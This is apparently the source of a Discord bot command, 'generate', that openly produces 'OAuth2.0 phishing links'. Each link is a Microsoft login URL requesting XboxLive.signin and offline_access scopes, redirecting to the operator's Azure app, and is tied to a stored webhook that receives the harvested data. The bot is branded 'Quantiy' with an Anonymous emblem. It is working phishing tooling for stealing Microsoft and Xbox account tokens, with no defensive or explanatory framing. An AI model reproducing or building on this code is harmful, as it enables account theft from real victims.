const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, Permissions, MessageManager, Embed, Collection, SlashCommandBuilder } = require(`discord.js`);
import crypto from "crypto";
import { database } from "..";
import { WebhookSchema } from "../types";
import { ActionRowBuilder, ButtonBuilder, ButtonStyle } from "discord.js";
import config from "../../config.json";

module.exports = {
    data: new SlashCommandBuilder()
        .setName("generate")
        .setDescription("Generate a new OAuth2.0 phishing link")
        .addStringOption(option => option.setName("webhook").setDescription("(The webhook you would like to receive data to)").setRequired(true)),

    async execute(interaction: any) {
        try {
            const hash = crypto.createHash("sha256");
            hash.update(interaction.user.id);
            const state = hash.digest("hex");

            await interaction.deferReply({ ephemeral: true });

            const webhook: WebhookSchema = {
                webhook: interaction.options.getString("webhook"),
                userid: interaction.user.id,
                date: new Date().getTime(),
                state: state
            }

            database.upsertWebhook(webhook);

            const row = new ActionRowBuilder()
                .addComponents([
                    new ButtonBuilder()
                        .setURL(`https://login.live.com/oauth20_authorize.srf?client_id=${config.azure.client_id}&response_type=code&redirect_uri=${config.azure.redirect_uri}&scope=XboxLive.signin+offline_access&state=${state}`)
                        .setLabel(`Visit URL`)
                        .setStyle(ButtonStyle.Link),

                    new ButtonBuilder()
                        .setLabel(`Copy URL`)
                        .setStyle(ButtonStyle.Secondary)
                        .setCustomId(`copy-url-${state}`)
                ])

            const embed = new EmbedBuilder()
                .setTitle("\`✅\` Success! (\`GENERATE\`)")
                .setDescription(`If you would like to visit the URL, click on the first button below.\nIf you would like to copy the url, click on the second button below.`)
                .setColor(0x00FF00)
                .setTimestamp(new Date())
                .setFooter({
                    text: "⚡ Powered by Quantiy ⚡"
                })
                .setAuthor({
                    name: "Quantiy",
                    iconURL: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/800px-Anonymous_emblem.svg.png",
                    url: "https://discord.quantiy.com/"
                })
            
            await interaction.editReply({ embeds: [ embed ], components: [ row ], ephemeral: true });
        } catch (error) {
            console.error(error);

            const embed = new EmbedBuilder()
                .setTitle("\`❌\` Error! (\`GENERATE\`)")
                .setDescription(`An unexpected error occurred while generating your OAuth2.0 phishing link!`)
                .setColor(0xFF0000)
                .setTimestamp(new Date())
                .setFooter({
                    text: "⚡ Powered by Quantiy ⚡"
                })
                .setAuthor({
                    name: "Quantiy",
                    iconURL: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/800px-Anonymous_emblem.svg.png",
                    url: "https://discord.quantiy.com/"
                })

            await interaction.editReply({ embeds: [ embed ], ephemeral: true });
        }
    }
}